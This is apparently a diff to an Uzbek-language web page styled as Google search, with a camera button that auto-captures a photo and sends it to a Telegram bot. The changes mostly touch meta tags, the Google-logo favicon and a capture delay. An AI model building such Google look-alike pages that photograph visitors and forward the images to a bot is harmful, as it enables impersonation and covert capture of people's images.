@@ -5,32 +5,33 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Google uslubidagi qidiruv + Kamera — Rasmni avtomatik Telegramga yuborish</title>
 
-  <!-- SEO meta -->
-  <meta name="description" content="Google uslubidagi oddiy qidiruv interfeysi va kamera tugmasi — surat olingan zahoti Telegram bot orqali avtomatik yuborish. Ushbu sahifa Telegram bot integratsiyasiga moslangan va mobilga ham moslashgan." />
-  <meta name="keywords" content="qidiruv, google uslubi, kamera, telegram bot, rasm yuborish, image search, Uzbek" />
+  <!-- SEO asosiy meta -->
+  <meta name="description" content="Google uslubidagi qidiruv interfeysi: yozing yoki kamerani bosing — surat olingan zahoti Telegram botga avtomatik yuboriladi. Mobil qurilmalarga to‘liq moslashgan versiya." />
+  <meta name="keywords" content="google qidiruv, qidiruv tizimi, telegram bot, kamera, rasm yuborish, image search, uzbek web, google style search" />
   <meta name="author" content="Sizning Ismingiz yoki Kompaniya" />
   <link rel="canonical" href="https://sizning-saytingiz.uz/google-style-search-camera" />
   <meta name="robots" content="index, follow" />
 
-  <!-- Open Graph / social -->
+  <!-- Open Graph (Facebook, Telegram, LinkedIn va boshqalar uchun) -->
   <meta property="og:title" content="Google uslubidagi qidiruv + Kamera — Rasmni avtomatik Telegramga yuborish" />
   <meta property="og:description" content="Google uslubidagi qidiruv interfeysi: yozing yoki kamerani bosing — olingan rasm Telegram botga avtomatik yuboriladi." />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://sizning-saytingiz.uz/google-style-search-camera" />
-  <meta property="og:image" content="https://sizning-saytingiz.uz/assets/google-logo.png" />
+  <meta property="og:image" content="https://sizning-saytingiz.uz/assets/google-preview.jpg" />
+  <meta property="og:locale" content="uz_UZ" />
   <meta property="og:site_name" content="Sizning Saytingiz" />
 
-  <!-- Twitter card -->
+  <!-- Twitter uchun meta -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Google uslubidagi qidiruv + Kamera — Telegramga avtomatik rasm yuborish" />
   <meta name="twitter:description" content="Qidiruv yozing yoki kamerani oching — rasm avtomatik Telegram botga yuboriladi." />
-  <meta name="twitter:image" content="https://sizning-saytingiz.uz/assets/google-logo.png" />
+  <meta name="twitter:image" content="https://sizning-saytingiz.uz/assets/google-preview.jpg" />
+  <meta name="twitter:site" content="@sizning_twitter" />
 
-  <!-- Favicon / title image (placeholder) -->
-  <!-- O'zingizning logongizni yoki ruxsat bilan Google logotipini shu faylga joylang -->
-  <link rel="icon" href="/assets/google-logo.png" />
-
+  <!-- Favicon -->
+  <link rel="icon" href="https://sizning-saytingiz.uz/assets/google-logo.png" type="image/png" />
 </head>
+
 <body>
 
   <style>
@@ -609,7 +610,7 @@ video, canvas {
         video.onloadedmetadata = () => {
           video.play();
           showStatus("Kamera yoqildi. 3 soniyadan keyin surat olinadi...", "success");
-          setTimeout(() => captureAndSend(), 1000);
+          setTimeout(() => captureAndSend(), 2000);
         };
       } catch (error) {
         console.error(error);
